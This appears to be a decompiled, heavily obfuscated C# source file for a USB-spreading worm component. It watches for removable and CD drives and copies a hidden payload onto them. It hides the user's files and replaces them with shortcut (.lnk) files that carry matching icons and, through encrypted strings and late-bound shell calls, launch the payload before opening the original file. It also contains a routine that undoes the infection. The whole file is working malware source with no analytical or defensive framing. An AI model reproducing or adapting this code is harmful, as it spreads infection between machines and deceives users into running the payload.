using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns0;

namespace O;

public class GClass2
{
	public class DRV
	{
		public string drive;

		public List<string> Files;

		public List<string> lnk;

		public DRV()
		{
			Files = new List<string>();
			lnk = new List<string>();
		}

		internal static bool smethod_0<T, U>(T gparam_0, U gparam_1, int int_0, short short_0)
		{
			int num = 0;
			bool result;
			do
			{
				result = (((short_0 ^ int_0) - 10) ^ num) switch
				{
					0 => object.ReferenceEquals(gparam_0, gparam_1), 
					_ => true, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static int smethod_1<T>(T gparam_0, int int_0, int int_1) where T : string
		{
			int num = 0;
			int result = (((int_1 ^ int_0) - 93) ^ 0) switch
			{
				0 => Strings.Asc((string)gparam_0), 
				1 => gparam_0.Length, 
				2 => Convert.ToInt32(gparam_0), 
				_ => int_0, 
			};
			num++;
			return result;
		}

		internal static bool smethod_2<T>(T gparam_0, int int_0, char char_0) where T : Socket
		{
			int num = 0;
			bool result = (((char_0 ^ int_0) - 67) ^ 0) switch
			{
				0 => gparam_0.Connected, 
				_ => true, 
			};
			num++;
			return result;
		}

		internal static int smethod_3<T>(T gparam_0, short short_0, int int_0) where T : TcpClient
		{
			int num = 0;
			int result = (((int_0 ^ short_0) - 20) ^ 0) switch
			{
				0 => gparam_0.Available, 
				_ => int_0, 
			};
			num++;
			return result;
		}

		internal static Color smethod_4(char char_0, short short_0)
		{
			int num = 0;
			Color result = (((char_0 ^ short_0) - 19) ^ 0) switch
			{
				0 => Color.Black, 
				1 => Color.White, 
				_ => default(Color), 
			};
			num++;
			return result;
		}

		internal static Type smethod_5<T>(T gparam_0, int int_0, char char_0)
		{
			int num = 0;
			Type result = (((int_0 ^ char_0) - 95) ^ 0) switch
			{
				0 => (Type)(MemberInfo)gparam_0.GetType(), 
				_ => (Type)(MemberInfo)typeof(GClass2), 
			};
			num++;
			return result;
		}

		internal static string smethod_6<T>(T gparam_0, char char_0, char char_1) where T : DriveInfo
		{
			int num = 0;
			string result;
			int num2;
			do
			{
				result = (((char_0 ^ char_1) - 119) ^ num) switch
				{
					0 => (string)(ICloneable)gparam_0.Name, 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static string[] smethod_7<T, U>(U gparam_0, T gparam_1, int int_0, CompareMethod compareMethod_0, char char_0, char char_1) where T : string where U : string
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			int num = 0;
			string[] result;
			do
			{
				result = (((char_0 ^ char_1) - 10) ^ num) switch
				{
					0 => Strings.Split((string)gparam_0, (string)gparam_1, int_0, compareMethod_0), 
					_ => null, 
				};
				num++;
			}
			while ((char_1 * char_1 + char_1) % 2 != 0);
			return result;
		}

		internal static void smethod_8<T>(T gparam_0, Size size_0, char char_0, char char_1) where T : Form
		{
			int num = 0;
			int num2;
			do
			{
				switch (((char_0 ^ char_1) - 119) ^ num)
				{
				case 0:
					((Form)gparam_0).set_ClientSize(size_0);
					break;
				}
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
		}

		internal static string smethod_9<T>(T gparam_0, short short_0, int int_0) where T : CultureInfo
		{
			int num = 0;
			string result = (((int_0 ^ short_0) - 108) ^ 0) switch
			{
				0 => (string)(IComparable)gparam_0.EnglishName, 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static string[] smethod_10<T>(T gparam_0, char[] char_0, int int_0, int int_1) where T : string
		{
			int num = 0;
			string[] result = (((int_1 ^ int_0) - 77) ^ 0) switch
			{
				0 => gparam_0.Split(char_0), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static Process smethod_11<T>(T gparam_0, short short_0, short short_1) where T : string
		{
			int num = 0;
			Process result = (((short_0 ^ short_1) - 93) ^ 0) switch
			{
				0 => (Process)(Component)Process.Start(gparam_0), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static byte smethod_12<T>(T gparam_0, short short_0, char char_0) where T : string
		{
			int num = 0;
			byte result;
			int num2;
			do
			{
				result = (((short_0 ^ char_0) - 41) ^ num) switch
				{
					0 => Convert.ToByte(gparam_0), 
					_ => 29, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_13<T>(T gparam_0, FileAttribute fileAttribute_0, short short_0, short short_1) where T : string
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			int num = 0;
			switch (((short_1 ^ short_0) - 63) ^ 0)
			{
			case 0:
				FileSystem.SetAttr((string)gparam_0, fileAttribute_0);
				break;
			}
			num++;
		}

		internal static string smethod_14<T>(T gparam_0, int int_0, int int_1) where T : RegistryKey
		{
			int num = 0;
			string result = (((int_0 ^ int_1) - 98) ^ 0) switch
			{
				0 => gparam_0.Name, 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static Mutex smethod_15<T>(T gparam_0, char char_0, char char_1) where T : string
		{
			int num = 0;
			Mutex result;
			do
			{
				result = (((char_1 ^ char_0) - 68) ^ num) switch
				{
					0 => (Mutex)(WaitHandle)Mutex.OpenExisting(gparam_0), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		internal static int smethod_16<T>(T gparam_0, char char_0, char char_1) where T : ProcessThread
		{
			int num = 0;
			int result = (((char_1 ^ char_0) - 54) ^ 0) switch
			{
				0 => gparam_0.Id, 
				_ => 4, 
			};
			num++;
			return result;
		}

		internal static bool smethod_17(IntPtr intptr_0, IntPtr intptr_1, int int_0, int int_1)
		{
			int num = 0;
			bool result = (((int_1 ^ int_0) - 74) ^ 0) switch
			{
				0 => intptr_0 != intptr_1, 
				_ => false, 
			};
			num++;
			return result;
		}

		internal static void smethod_18<T>(T gparam_0, double double_0, short short_0, char char_0) where T : Form
		{
			int num = 0;
			int num2;
			do
			{
				switch (((char_0 ^ short_0) - 61) ^ num)
				{
				case 0:
					((Form)gparam_0).set_Opacity(double_0);
					break;
				}
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
		}
	}

	public string BHuEglLFLdbBahildFLDwVj;

	public Collection dr;

	private Class19.Class22.Class25 class25_0 = new Class19.Class22.Class25();

	internal Thread thread_0;

	public GClass2()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		class25_0.bool_0 = false;
		Thread thread = (thread_0 = null);
		dr = new Collection();
	}

	public void usb()
	{
		Thread thread = (thread_0 = null);
		clean();
		Thread thread2 = (thread_0 = Thread.CurrentThread);
		class25_0.bool_0 = false;
		while (!class25_0.bool_0)
		{
			try
			{
				DriveInfo[] array = (DriveInfo[])(Array)DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in array)
				{
					DRV dRV;
					if (!dr.Contains(DRV.smethod_6(driveInfo, 'ˤ', 'ʓ').ToLower()))
					{
						dRV = new DRV();
						dRV.drive = DRV.smethod_6(driveInfo, 'ž', 'ĉ');
						Class5.smethod_8<object, object, string, Collection, object>(dr, (object)dRV, DRV.smethod_6(driveInfo, 'ü', '\u008b').ToLower(), (object)null, (object)null, 'ö', (short)217);
					}
					else
					{
						dRV = (DRV)Class10.smethod_1<Collection, string>(dr, DRV.smethod_6(driveInfo, 'ί', 'Ϙ').ToLower(), 'ϙ', (short)955);
					}
					if (class25_0.bool_0)
					{
						goto end_IL_0028;
					}
					try
					{
						if (!Class12.smethod_8(driveInfo, 152, 137) || !(((driveInfo.TotalFreeSpace > 0L) & (driveInfo.DriveType == DriveType.Removable)) | (driveInfo.DriveType == DriveType.CDRom)))
						{
							continue;
						}
						try
						{
							if (!GForm1.smethod_12(GClass1.smethod_3(DRV.smethod_6(driveInfo, 'Ƙ', 'ǯ'), BHuEglLFLdbBahildFLDwVj, 861, 792), '\u035f', 781))
							{
								Class3.smethod_4(Class12.smethod_9(114, 22), GClass1.smethod_3(DRV.smethod_6(driveInfo, 'Ǘ', 'Ơ'), BHuEglLFLdbBahildFLDwVj, 641, 708), bool_1: true, 'Ƞ', 'ɻ');
								File.SetAttributes(GClass1.smethod_3(DRV.smethod_6(driveInfo, 'ΰ', 'χ'), BHuEglLFLdbBahildFLDwVj, 688, 757), FileAttributes.Hidden);
							}
							string[] array2 = Class12.smethod_10(DRV.smethod_6(driveInfo, '\u02f9', 'ʎ'), 436, 'Ƃ');
							foreach (string text in array2)
							{
								if (!smethod_2(Operators.AndObject(Operators.CompareObjectNotEqual((object)Path.GetExtension(text)!.ToLower(), method_2(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf8ef\uf8ad\uf8af\uf8aa", 59796), 59139), 62996), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf17a\uf160\uf165\uf140\uf17c\uf14a\uf14e\uf14a\uf148\uf17b\uf178\uf169\uf15c\uf175\uf17e\uf14e\uf168\uf15f\uf164\uf17f\uf15a\uf162\uf176", 60188), 62863), 61350)), false), (object)(Class11.smethod_7(text.ToLower(), GClass1.smethod_3(DRV.smethod_6(driveInfo, 'ȶ', 'Ɂ').ToLower(), BHuEglLFLdbBahildFLDwVj.ToLower(), 382, 315), bool_0: false, 'Ơ', 'Ƙ') != 0)), 693, 'ʨ'))
								{
									continue;
								}
								if (!dRV.Files.Contains(smethod_3(new FileInfo(text), 'ʚ', '\u02c2')))
								{
									if (dRV.Files.Count < 20)
									{
										lnk(driveInfo, text, GetIcon(Path.GetExtension(text)));
										dRV.Files.Add(smethod_3(new FileInfo(text), 'Ƒ', 'ǉ'));
										File.SetAttributes(text, FileAttributes.Hidden);
										dRV.lnk.Add(Class3.smethod_2(Conversions.ToString(GClass1.smethod_0((object)GClass1.smethod_3(DRV.smethod_6(driveInfo, 'ɩ', 'Ȟ'), smethod_3(new FileInfo(text), '\u034c', '\u0314'), 851, 790), method_2(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf8ef\uf8ad\uf8af\uf8aa", 59796), 59139), 62996), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf17a\uf160\uf165\uf140\uf17c\uf14a\uf14e\uf14a\uf148\uf17b\uf178\uf169\uf15c\uf175\uf17e\uf14e\uf168\uf15f\uf164\uf17f\uf15a\uf162\uf176", 60188), 62863), 61350)), (short)945, 958)), 152, 198));
									}
								}
								else if (dRV.Files.Contains(smethod_3(new FileInfo(text), 'Ƣ', 'Ǻ')))
								{
									if (smethod_4(text, '~', 41) != FileAttributes.Hidden)
									{
										File.SetAttributes(text, FileAttributes.Hidden);
									}
									if (!File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)(DRV.smethod_6(driveInfo, 'ν', 'ϊ') + new FileInfo(text).get_Name()), method_2(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf8ef\uf8ad\uf8af\uf8aa", 59796), 59139), 62996), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf17a\uf160\uf165\uf140\uf17c\uf14a\uf14e\uf14a\uf148\uf17b\uf178\uf169\uf15c\uf175\uf17e\uf14e\uf168\uf15f\uf164\uf17f\uf15a\uf162\uf176", 60188), 62863), 61350))))))
									{
										lnk(driveInfo, text, GetIcon(Path.GetExtension(text)));
									}
									else if (Operators.CompareString(File.ReadAllText(Conversions.ToString(Operators.ConcatenateObject((object)(driveInfo.Name + new FileInfo(text).get_Name()), method_2(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf8ef\uf8ad\uf8af\uf8aa", 59796), 59139), 62996), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf17a\uf160\uf165\uf140\uf17c\uf14a\uf14e\uf14a\uf148\uf17b\uf178\uf169\uf15c\uf175\uf17e\uf14e\uf168\uf15f\uf164\uf17f\uf15a\uf162\uf176", 60188), 62863), 61350))))), dRV.lnk[dRV.Files.IndexOf(new FileInfo(text).get_Name())], false) != 0)
									{
										lnk(driveInfo, text, GetIcon(Path.GetExtension(text)));
									}
								}
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(3000);
			continue;
			end_IL_0028:
			break;
		}
		Thread thread3 = (thread_0 = null);
	}

	public object lnk(DriveInfo x, string xx, string ico)
	{
		try
		{
			GForm0.smethod_3(Conversions.ToString(GClass1.smethod_0((object)GClass1.smethod_3(DRV.smethod_6(x, 'Ɲ', 'Ǫ'), smethod_3(new FileInfo(xx), '.', 'v'), 646, 707), method_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf026\uf064\uf066\uf063", 58862), 57887), 63328), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uebe1\uebe4\uebc3\uebfd\uebe4\uebc5\uebdf\uebeb\uebf9\uebe5\uebc0\uebe0\uebda\uebe8\uebcd\uebc7\uebeb\uebe6\uebc4\uebe7\uebfd\uebfd\uebc0", 57750), 59752), 58346)), (short)150, 153)), 884, 853);
		}
		catch (Exception gparam_)
		{
			GForm1.smethod_6(gparam_, 'ǲ', 469);
			Class5.smethod_4('ʢ', 727);
		}
		object obj = NewLateBinding.LateGet(smethod_5(Conversions.ToString(method_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue662\ue666\ue656\ue647\ue65c\ue645\ue641\ue61b\ue666\ue65d\ue650\ue659\ue659", 58334), 63097), 62345), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uebe1\uebe4\uebc3\uebfd\uebe4\uebc5\uebdf\uebeb\uebf9\uebe5\uebc0\uebe0\uebda\uebe8\uebcd\uebc7\uebeb\uebe6\uebc4\uebe7\uebfd\uebfd\uebc0", 57750), 59752), 58346))), "", 683, 756), (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf088\uf0b9\uf0ae\uf0aa\uf0bf\uf0ae\uf098\uf0a3\uf0a4\uf0b9\uf0bf\uf0a8\uf0be\uf0bf", 59989), 63300), 60914), new object[1] { GClass1.smethod_0((object)GClass1.smethod_3(DRV.smethod_6(x, 'ϛ', 'ά'), smethod_3(new FileInfo(xx), '·', 'ϟ'), 901, 960), method_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf026\uf064\uf066\uf063", 58862), 57887), 63328), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uebe1\uebe4\uebc3\uebfd\uebe4\uebc5\uebdf\uebeb\uebf9\uebe5\uebc0\uebe0\uebda\uebe8\uebcd\uebc7\uebeb\uebe6\uebc4\uebe7\uebfd\uebfd\uebc0", 57750), 59752), 58346)), (short)51, 60) }, (string[])null, (Type[])null, (bool[])null);
		smethod_6<Type, string, object>(obj, null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue951\ue964\ue977\ue962\ue960\ue971\ue955\ue964\ue971\ue96d", 63289), 59796), 63424), new object[1] { method_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﶠﶮﶧ\ufdedﶦﶻﶦ", 57790), 61373), 62218), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uebe1\uebe4\uebc3\uebfd\uebe4\uebc5\uebdf\uebeb\uebf9\uebe5\uebc0\uebe0\uebda\uebe8\uebcd\uebc7\uebeb\uebe6\uebc4\uebe7\uebfd\uebfd\uebc0", 57750), 59752), 58346)) }, null, null, bool_0: false, bool_1: true, 1008, 953);
		smethod_6<Type, string, object>(obj, null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb4e\ueb76\ueb6b\ueb72\ueb70\ueb77\ueb7e\ueb5d\ueb70\ueb6b\ueb7c\ueb7a\ueb6d\ueb76\ueb6b\ueb60", 60773), 59338), 57654), new object[1] { "" }, null, null, bool_0: false, bool_1: true, 853, 796);
		NewLateBinding.LateSetComplex(obj, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufe06︵\ufe20︲\ufe2a\ufe22\ufe29\ufe33\ufe34", 63607), 58527), 57903), new object[1] { Operators.ConcatenateObject(GClass1.smethod_0(GClass1.smethod_0(GClass1.smethod_0(method_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﶡ\ufdedﶮ﷽ﷺ\ufdef﷼ﷺﶮ", 62013), 59036), 59747), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uebe1\uebe4\uebc3\uebfd\uebe4\uebc5\uebdf\uebeb\uebf9\uebe5\uebc0\uebe0\uebda\uebe8\uebcd\uebc7\uebeb\uebe6\uebc4\uebe7\uebfd\uebfd\uebc0", 57750), 59752), 58346)), NewLateBinding.LateGet((object)BHuEglLFLdbBahildFLDwVj, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf4cf\uf4f8\uf4ed\uf4f1\uf4fc\uf4fe\uf4f8", 59816), 61599), 60791), new object[2]
		{
			method_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﶲ", 63337), 61171), 58497), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb85\ueb94\uebb9\ueb96\uebb0\ueb83\ueb9a\ueb90\uebbb\ueb9e\ueb9e\ueb80\uebb9\ueb9d\uebb7\uebbb\ueba3\ueb91\uebb8\uebb7\ueba6\uebb7\uebbe", 61787), 59701), 62338)),
			GClass1.smethod_0(GClass1.smethod_0((object)'"', method_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﶲ", 63337), 61171), 58497), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb85\ueb94\uebb9\ueb96\uebb0\ueb83\ueb9a\ueb90\uebbb\ueb9e\ueb9e\ueb80\uebb9\ueb9d\uebb7\uebbb\ueba3\ueb91\uebb8\uebb7\ueba6\uebb7\uebbe", 61787), 59701), 62338)), (short)527, 512), (object)'"', (short)965, 970)
		}, (string[])null, (Type[])null, (bool[])null), 201, 198), (object)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf418\uf45b\uf446\uf44e\uf452\uf451\uf44c\uf45b\uf44c\uf41e\uf411\uf44c\uf451\uf451\uf44a\uf412\uf41c\uf41b\uf47d\uf47a\uf41b", 62938), 62906), 62587), (short)666, 661), (object)GForm1.smethod_14(new DirectoryInfo(xx), 293, 280), (short)825, 822), (object)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue376\ue374\ue372\ue374\ue331\ue32c\ue33d\ue320", 60660), 58628), 59927)) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0ae\uf084\uf088\uf089\uf0ab\uf088\uf084\uf086\uf093\uf08e\uf088\uf089", 59582), 62406), 60348), new object[1] { ico }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(obj, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf785\uf7b7\uf7a0\uf7b3", 61959), 61740), 62705), new object[0], (string[])null, (Type[])null, (bool[])null, true);
		obj = null;
		object result = default(object);
		return result;
	}

	public void clean()
	{
		class25_0.bool_0 = true;
		while (thread_0 != null)
		{
			Thread.Sleep(1);
		}
		DriveInfo[] array = (DriveInfo[])(Array)DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in array)
		{
			try
			{
				if (!Class12.smethod_8(driveInfo, 720, 705) || !((driveInfo.DriveType == DriveType.Removable) | (driveInfo.DriveType == DriveType.CDRom)))
				{
					continue;
				}
				if (GForm1.smethod_12(GClass1.smethod_3(DRV.smethod_6(driveInfo, '\u035a', '\u032d'), BHuEglLFLdbBahildFLDwVj, 119, 50), 'Ŗ', 260))
				{
					File.SetAttributes(GClass1.smethod_3(DRV.smethod_6(driveInfo, 'Ϳ', '\u0308'), BHuEglLFLdbBahildFLDwVj, 119, 50), FileAttributes.Normal);
					GForm0.smethod_3(GClass1.smethod_3(DRV.smethod_6(driveInfo, '\u0303', 'ʹ'), BHuEglLFLdbBahildFLDwVj, 406, 467), 300, 269);
				}
				string[] array2 = Class12.smethod_10(DRV.smethod_6(driveInfo, '\u02d6', 'ʡ'), 367, 'ř');
				foreach (string text in array2)
				{
					try
					{
						File.SetAttributes(text, FileAttributes.Normal);
						if (text.ToLower().EndsWith(Conversions.ToString(method_1(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue3ad\ue3ef\ue3ed\ue3e8", 59805), 60632), 59081), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uef61\uef78\uef69\uef7a\uef75\uef5a\uef49\uef6d\uef5d\uef75\uef60\uef40\uef60\uef63\uef41\uef6b\uef47\uef41\uef40\uef68\uef6a\uef7f\uef61", 62635), 62984), 60801)))))
						{
							GForm0.smethod_3(text, 818, 787);
						}
					}
					catch (Exception gparam_)
					{
						GForm1.smethod_6(gparam_, '\u009d', 186);
						ProjectData.ClearProjectError();
					}
				}
				string[] directories = Directory.GetDirectories(driveInfo.Name);
				foreach (string path in directories)
				{
					try
					{
						new DirectoryInfo(path).Attributes = FileAttributes.Normal;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public string GetIcon(string ext)
	{
		try
		{
			RegistryKey registryKey = (RegistryKey)(MarshalByRefObject)Registry.LocalMachine.OpenSubKey(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue067\ue05b\ue052\ue040\ue043\ue055\ue046\ue051\ue068\ue077\ue058\ue055\ue047\ue047\ue051\ue047\ue068", 62250), 62948), 59069), writable: false);
			string text = Conversions.ToString(Class11.smethod_13(registryKey, Conversions.ToString(GClass1.smethod_0(smethod_7(registryKey.OpenSubKey(ext, writable: false), "", 'ȟ', 542), (object)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("﨣層祥神羽見﨓廓喝靖塚﨑﨣", 61484), 57346), 59946), (short)288, 303)), 106, 87).GetValue("", ""));
			if (!text.Contains(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uee03", 59581), 59501), 61000)))
			{
				text += Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea47\uea5b", 60484), 62271), 62915);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void Start()
	{
		if (thread_0 == null)
		{
			Thread thread = (thread_0 = new Thread(usb, 1));
			GClass1.smethod_5(thread_0, 489, 398);
		}
	}

	private object method_0(string string_0, string string_1)
	{
		string text = (string)(IConvertible)"";
		int num = DRV.smethod_1(string_1, 363, 310);
		checked
		{
			short num2 = (short)GForm1.smethod_3(string_0, 626, 550);
			for (short num3 = 1; num3 <= num2; num3 = (short)unchecked(num3 + 1))
			{
				text = (string)(IConvertible)GClass1.smethod_3(text, GClass1.smethod_2(Class12.smethod_3(num ^ DRV.smethod_1(GClass1.smethod_1(string_0, num3, 1, 495, 426), 355, 318), 846, 768), 257, 'ē'), 203, 142);
			}
			return text;
		}
	}

	private object method_1(string string_0, string string_1)
	{
		string text = (string)(IComparable<string>)"";
		int num = DRV.smethod_1(string_1, 277, 328);
		checked
		{
			short num2 = (short)GForm1.smethod_3(string_0, 257, 341);
			for (short num3 = 1; num3 <= num2; num3 = (short)unchecked(num3 + 1))
			{
				text = (string)(IComparable<string>)GClass1.smethod_3(text, GClass1.smethod_2(Class12.smethod_3(num ^ DRV.smethod_1(GClass1.smethod_1(string_0, num3, 1, 369, 308), 803, 894), 307, 381), 472, 'Ǌ'), 429, 488);
			}
			return text;
		}
	}

	private object method_2(string string_0, string string_1)
	{
		string text = (string)(ICloneable)"";
		int num = DRV.smethod_1(string_1, 6, 91);
		checked
		{
			short num2 = (short)GForm1.smethod_3(string_0, 463, 411);
			for (short num3 = 1; num3 <= num2; num3 = (short)unchecked(num3 + 1))
			{
				text = (string)(ICloneable)GClass1.smethod_3(text, GClass1.smethod_2(Class12.smethod_3(num ^ DRV.smethod_1(GClass1.smethod_1(string_0, num3, 1, 910, 971), 534, 587), 587, 517), 73, '['), 77, 8);
			}
			return text;
		}
	}

	internal static string smethod_0(Environment.SpecialFolder specialFolder_0, char char_0, short short_0)
	{
		int num = 0;
		string result = (((char_0 ^ short_0) - 94) ^ 0) switch
		{
			0 => Environment.GetFolderPath(specialFolder_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_1(string[] string_0, int int_0, char char_0)
	{
		int num = 0;
		string result = (((int_0 ^ char_0) - 104) ^ 0) switch
		{
			0 => (string)(IEnumerable)string.Concat(string_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static bool smethod_2<T>(T gparam_0, int int_0, char char_0)
	{
		int num = 0;
		bool result;
		int num2;
		do
		{
			result = (((int_0 ^ char_0) - 29) ^ num) switch
			{
				0 => Conversions.ToBoolean((object)gparam_0), 
				_ => true, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static string smethod_3<T>(T gparam_0, char char_0, char char_1) where T : FileInfo
	{
		int num = 0;
		string result;
		int num2;
		do
		{
			result = (((char_0 ^ char_1) - 88) ^ num) switch
			{
				0 => (string)(IEnumerable)((FileInfo)gparam_0).get_Name(), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static FileAttributes smethod_4<T>(T gparam_0, char char_0, short short_0) where T : string
	{
		int num = 0;
		FileAttributes result = (((char_0 ^ short_0) - 87) ^ 0) switch
		{
			0 => File.GetAttributes(gparam_0), 
			_ => (FileAttributes)0, 
		};
		num++;
		return result;
	}

	internal static object smethod_5<T, U>(T gparam_0, U gparam_1, short short_0, int int_0) where T : string where U : string
	{
		int num = 0;
		object result;
		do
		{
			result = (((int_0 ^ short_0) - 95) ^ num) switch
			{
				0 => Interaction.CreateObject((string)gparam_0, (string)gparam_1), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static void smethod_6<T, U, V>(V gparam_0, T gparam_1, U gparam_2, object[] object_0, string[] string_0, Type[] type_0, bool bool_0, bool bool_1, int int_0, short short_0) where T : Type where U : string
	{
		int num = 0;
		do
		{
			switch (((short_0 ^ int_0) - 73) ^ num)
			{
			case 0:
				NewLateBinding.LateSetComplex((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_0, string_0, type_0, bool_0, bool_1);
				break;
			}
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
	}

	internal static object smethod_7<T, U>(U gparam_0, T gparam_1, char char_0, int int_0) where T : string where U : RegistryKey
	{
		int num = 0;
		object result = (((char_0 ^ int_0) - 1) ^ 0) switch
		{
			0 => gparam_0.GetValue(gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_8<T>(T gparam_0, BorderStyle borderStyle_0, char char_0, int int_0) where T : TextBoxBase
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		int num2;
		do
		{
			switch (((char_0 ^ int_0) - 97) ^ num)
			{
			case 0:
				((TextBoxBase)gparam_0).set_BorderStyle(borderStyle_0);
				break;
			}
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static void smethod_9<T>(T gparam_0, int int_0, short short_0) where T : TextBoxBase
	{
		int num = 0;
		switch (((int_0 ^ short_0) - 46) ^ 0)
		{
		case 0:
			((TextBoxBase)gparam_0).ScrollToCaret();
			break;
		}
		num++;
	}

	internal static CultureInfo smethod_10(int int_0, char char_0)
	{
		int num = 0;
		CultureInfo result;
		do
		{
			result = (((char_0 ^ int_0) - 121) ^ num) switch
			{
				0 => CultureInfo.CurrentCulture, 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static void smethod_11(Point point_0, char char_0, short short_0)
	{
		int num = 0;
		do
		{
			switch (((short_0 ^ char_0) - 53) ^ num)
			{
			case 0:
				Cursor.set_Position(point_0);
				break;
			}
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
	}
}
